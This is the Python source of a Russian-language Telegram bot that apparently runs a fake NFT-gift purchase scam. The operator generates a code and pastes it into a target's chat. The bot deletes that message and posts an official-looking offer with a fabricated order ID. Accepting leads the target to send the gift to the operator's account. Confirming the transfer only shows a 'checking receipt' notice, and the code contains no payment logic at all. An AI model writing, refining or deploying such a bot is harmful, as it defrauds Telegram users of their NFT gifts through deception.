import asyncio
import os
import re
import random
import string
import logging
import html
import aiohttp
import aiosqlite
from dotenv import load_dotenv
from datetime import datetime
from aiohttp import web
from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command, CommandStart
from aiogram.types import (
    Message, 
    CallbackQuery, 
    InlineKeyboardMarkup, 
    InlineKeyboardButton,
    LinkPreviewOptions
)
from aiogram.enums import ParseMode
from aiogram.client.default import DefaultBotProperties
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup

load_dotenv()

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(name)s | %(message)s"
)
logger = logging.getLogger("offers-bot")

BOT_TOKEN = os.getenv("BOT_TOKEN")
if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN не найден!")

MANAGER_LINK = "tg://send_gift?to=Autooffersgift"
STARS_TO_USD = 0.013

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=MemoryStorage())


class OfferState(StatesGroup):
    waiting_for_data = State()


async def init_db():
    async with aiosqlite.connect("offers.db") as db:
        await db.execute("""
            CREATE TABLE IF NOT EXISTS offers (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                code TEXT UNIQUE,
                order_id TEXT,
                gift TEXT,
                amount INTEGER,
                currency TEXT,
                buyer_id INTEGER,
                buyer_username TEXT,
                status TEXT DEFAULT 'pending',
                created_at TEXT
            )
        """)
        await db.commit()


def generate_code(length=5):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))


def generate_order_id():
    return f"TG-{datetime.now().strftime('%y%m%d%H%M%S')[2:]}"


def make_offer_text(gift: str, amount: int, buyer_username: str | None = None, language: str = "ru") -> str:
    gift_link = f"https://t.me/nft/{gift}"
    buyer = f"@{html.escape(buyer_username)}" if buyer_username else "Покупатель"
    safe_gift = html.escape(gift)
    return (
        "━━━━━━━━━━━━━━━━━━━━\n"
        "✨ <b>НОВЫЙ ОФФЕР НА NFT</b> ✨\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🎁 <a href=\"{gift_link}\"><b>{safe_gift}</b></a>\n"
        f"⭐️ <b>{amount:,} STARS</b>\n"
        f"👤 {buyer}\n"
        f"🌐 Язык: <b>{html.escape(language.upper())}</b>\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "👇 <b>Выберите действие</b>"
    )


async def fetch_nft_image(gift: str) -> str | None:
    url = f"https://t.me/nft/{gift}"
    timeout = aiohttp.ClientTimeout(total=8)
    try:
        async with aiohttp.ClientSession(timeout=timeout, headers={"User-Agent": "Mozilla/5.0"}) as session:
            async with session.get(url, allow_redirects=True) as response:
                if response.status != 200:
                    return None
                page = await response.text()
        for tag in re.findall(r"<meta\b[^>]*>", page, flags=re.IGNORECASE):
            if not re.search(r"""(?:property|name)\s*=\s*["']og:image["']""", tag, flags=re.IGNORECASE):
                continue
            match = re.search(r"""content\s*=\s*["']([^"']+)["']""", tag, flags=re.IGNORECASE)
            if match:
                return html.unescape(match.group(1))
    except Exception as exc:
        logger.warning("Не удалось получить изображение NFT %s: %s", gift, exc)
    return None


def make_accepted_text(gift: str, amount: int, order_id: str) -> str:
    usd = round(amount * STARS_TO_USD, 2)
    gift_link = f"https://t.me/nft/{gift}"

    return (
        f"✅ <b>Принято</b>\n\n"
        f"🎁 <a href=\"{gift_link}\"><b>{gift}</b></a>\n"
        f"⭐️ <b>{amount}</b> Stars  ·  ≈ ${usd}\n"
        f"📄 <code>{order_id}</code>\n\n"
        f"Передайте подарок менеджеру 👇"
    )


def make_waiting_text(amount: int) -> str:
    usd = round(amount * STARS_TO_USD, 2)
    return (
        f"⏳ <b>Проверяем поступление</b>\n\n"
        f"Ожидание: до 30 минут\n"
        f"⭐️ <b>{amount}</b> Stars  ·  ≈ ${usd}"
    )


def offer_keyboard(offer_id: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="✅ Принять", callback_data=f"accept:{offer_id}"),
            InlineKeyboardButton(text="❌ Отклонить", callback_data=f"decline:{offer_id}")
        ]
    ])


def accepted_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🎁 Передать подарок", url=MANAGER_LINK)],
        [InlineKeyboardButton(text="✅ Подтвердить передачу", callback_data="confirm_transfer")]
    ])


@dp.message(CommandStart())
async def cmd_start(message: Message):
    await message.answer("👋 Бот офферов\n\nНапиши /offer чтобы создать оффер")


@dp.message(Command("offer"))
@dp.message(Command("оффер"))
@dp.message(F.text.func(lambda value: isinstance(value, str) and value.strip().casefold() == "оффер"))
async def cmd_offer(message: Message, state: FSMContext):
    await state.set_state(OfferState.waiting_for_data)
    await message.answer("Кидай данные:\n<code>SnoopCigar-84846 3200 stars</code>")


async def create_offer_from_text(message: Message, state: FSMContext | None = None):
    raw_text = (message.text or "").strip()
    match = re.match(
        r"^(?:https?://t\.me/nft/)?([A-Za-z0-9]+-\d+)\s+(\d+)\s+([A-Za-z]{2,5})$",
        raw_text,
        re.IGNORECASE,
    )
    if not match:
        await message.answer(
            "Неверный формат. Отправь одной строкой:\n"
            "<code>SignetRing-9041 1200 ru</code>"
        )
        return

    gift = match.group(1)
    amount = int(match.group(2))
    language = match.group(3).lower()
    if amount <= 0:
        await message.answer("Количество Stars должно быть больше нуля.")
        return

    code = generate_code()
    order_id = generate_order_id()
    async with aiosqlite.connect("offers.db") as db:
        await db.execute(
            """INSERT INTO offers (code, order_id, gift, amount, currency, buyer_id, buyer_username, status, created_at)
               VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
            (code, order_id, gift, amount, language, message.from_user.id,
             message.from_user.username, "pending", datetime.now().isoformat())
        )
        await db.commit()

    if state is not None:
        await state.clear()
    await message.answer(
        "✅ <b>Код для отправки оффера готов</b>\n\n"
        f"🎁 <b>{html.escape(gift)}</b>\n"
        f"⭐️ <b>{amount:,} Stars</b>\n"
        f"🌐 Язык: <b>{html.escape(language.upper())}</b>\n\n"
        f"Твой код: <code>{code}</code>\n\n"
        "Скопируй код и отправь его в чат покупателя."
    )


@dp.message(F.chat.type == "private", F.text.regexp(r"^(?:https?://t\.me/nft/)?[A-Za-z0-9]+-\d+\s+\d+\s+[A-Za-z]{2,5}$"))
async def direct_offer_input(message: Message, state: FSMContext):
    await create_offer_from_text(message, state)


@dp.message(OfferState.waiting_for_data)
async def process_offer_data(message: Message, state: FSMContext):
    await create_offer_from_text(message, state)


@dp.message(F.text.regexp(r"^[A-Z0-9]{5}$"))
async def handle_code(message: Message):
    code = message.text.strip().upper()

    async with aiosqlite.connect("offers.db") as db:
        async with db.execute(
            "SELECT id, gift, amount, buyer_username, order_id, currency FROM offers WHERE code = ? AND status = 'pending' LIMIT 1",
            (code,)
        ) as cursor:
            offer = await cursor.fetchone()

    if not offer:
        return

    offer_id, gift, amount, buyer_username, order_id, language = offer

    try:
        await message.delete()
    except Exception:
        pass

    text = make_offer_text(gift, amount, buyer_username, language or "ru")
    kb = offer_keyboard(offer_id)
    image_url = await fetch_nft_image(gift)
    if image_url:
        try:
            await message.answer_photo(photo=image_url, caption=text, reply_markup=kb)
        except Exception as exc:
            logger.warning("Не удалось отправить NFT-картинку %s: %s", gift, exc)
            await message.answer(
                text,
                reply_markup=kb,
                link_preview_options=LinkPreviewOptions(
                    url=f"https://t.me/nft/{gift}",
                    prefer_large_media=True,
                    show_above_text=True,
                ),
            )
    else:
        await message.answer(
            text,
            reply_markup=kb,
            link_preview_options=LinkPreviewOptions(
                url=f"https://t.me/nft/{gift}",
                prefer_large_media=True,
                show_above_text=True,
            ),
        )

    async with aiosqlite.connect("offers.db") as db:
        await db.execute("UPDATE offers SET status = 'sent' WHERE id = ?", (offer_id,))
        await db.commit()


@dp.callback_query(F.data.startswith("accept:"))
async def accept_offer(callback: CallbackQuery):
    offer_id = int(callback.data.split(":")[1])

    async with aiosqlite.connect("offers.db") as db:
        async with db.execute("SELECT gift, amount, order_id FROM offers WHERE id = ?", (offer_id,)) as cursor:
            offer = await cursor.fetchone()

    if not offer:
        await callback.answer("Оффер не найден", show_alert=True)
        return

    gift, amount, order_id = offer
    text = make_accepted_text(gift, amount, order_id)
    kb = accepted_keyboard()

    await callback.message.edit_text(text, reply_markup=kb)
    await callback.answer("✅ Принято")

    try:
        await bot.pin_chat_message(callback.message.chat.id, callback.message.message_id)
    except Exception:
        pass

    async with aiosqlite.connect("offers.db") as db:
        await db.execute("UPDATE offers SET status = 'accepted' WHERE id = ?", (offer_id,))
        await db.commit()


@dp.callback_query(F.data.startswith("decline:"))
async def decline_offer(callback: CallbackQuery):
    await callback.message.edit_text("❌ Отклонено")
    await callback.answer()


@dp.callback_query(F.data == "confirm_transfer")
async def confirm_transfer(callback: CallbackQuery):
    async with aiosqlite.connect("offers.db") as db:
        async with db.execute("SELECT amount FROM offers WHERE status = 'accepted' ORDER BY id DESC LIMIT 1") as cursor:
            row = await cursor.fetchone()

    amount = row[0] if row else 0
    await callback.message.answer(make_waiting_text(amount))
    await callback.answer()


async def health_handler(request):
    return web.Response(text="Bot is running")


async def start_web_server():
    app = web.Application()
    app.router.add_get("/", health_handler)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.getenv("PORT", 10000))
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()


async def main():
    await init_db()
    # Polling не работает одновременно с активным webhook Telegram.
    await bot.delete_webhook(drop_pending_updates=False)
    me = await bot.get_me()
    logger.info("Бот запущен: @%s (id=%s)", me.username, me.id)

    web_task = asyncio.create_task(start_web_server(), name="health-server")
    try:
        await dp.start_polling(
            bot,
            allowed_updates=dp.resolve_used_update_types(),
            handle_as_tasks=True,
        )
    finally:
        web_task.cancel()
        try:
            await web_task
        except asyncio.CancelledError:
            pass
        await bot.session.close()


if __name__ == "__main__":
    asyncio.run(main())
